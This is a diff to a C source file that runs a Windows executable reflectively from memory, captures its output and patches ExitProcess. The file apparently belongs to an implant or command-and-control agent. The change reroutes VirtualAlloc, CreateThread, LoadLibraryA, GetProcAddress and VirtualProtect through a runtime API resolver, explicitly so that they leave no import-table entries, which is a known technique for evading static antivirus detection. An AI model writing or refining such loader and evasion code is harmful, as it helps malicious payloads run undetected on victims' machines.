@@ -11,11 +11,9 @@
  *  7. Redirect stdout/stderr to anonymous pipe; create thread at EntryPoint
  *  8. Wait up to 30 s; collect and return captured output
  *
- * NOTE: This file intentionally does NOT include api_resolve.h.  The PE
- * loader needs VirtualAlloc, CreateThread, LoadLibraryA, and GetProcAddress
- * via direct calls — those symbols are not in the resolver table and must be
- * present in the IAT at link time anyway.  Mixing resolved + direct calls for
- * the same PE would also break pointer identity inside the loaded image's IAT.
+ * All previously-direct calls (VirtualAlloc, CreateThread, LoadLibraryA,
+ * GetProcAddress, VirtualProtect) are now redirected through api_resolve.h
+ * function pointers so they produce no IAT entries from this translation unit.
  */
 
 #include "pe_exec.h"
@@ -23,6 +21,7 @@
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
+#include "api_resolve.h"
 
 /* Maximum time to wait for the entry point to return (30 seconds). */
 #define PE_EXEC_TIMEOUT_MS 30000
@@ -293,7 +292,7 @@ char* exec_pe(const uint8_t *pe_bytes, size_t pe_len) {
     void  *ep_addr    = NULL;
     BOOL   ep_patched = FALSE;
     {
-        HMODULE k32 = LoadLibraryA("kernel32.dll");
+        HMODULE k32 = GetModuleHandleA("kernel32.dll");
         if (k32) {
             ep_addr = (void *)GetProcAddress(k32, "ExitProcess");
             if (ep_addr) {
